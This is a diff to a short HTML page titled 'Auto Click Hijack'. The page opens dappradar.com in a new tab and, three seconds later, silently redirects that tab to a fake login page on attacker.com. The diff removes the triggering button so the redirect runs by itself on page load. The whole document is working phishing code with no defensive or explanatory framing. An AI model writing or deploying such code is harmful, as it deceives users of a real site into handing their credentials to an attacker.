@@ -1,19 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Click Hijack</title>
+    <title>Auto Click Hijack</title>
 </head>
 <body>
-    <button id="openTab">Check Your Account</button>
-
     <script>
-        document.getElementById("openTab").addEventListener("click", function() {
+        window.onload = function() {
             let newTab = window.open("https://dappradar.com", "_blank");
 
             setTimeout(() => {
                 newTab.location = "https://attacker.com/fake-login"; // Redirect after 3 seconds
             }, 3000);
-        });
+        };
     </script>
 </body>
 </html>
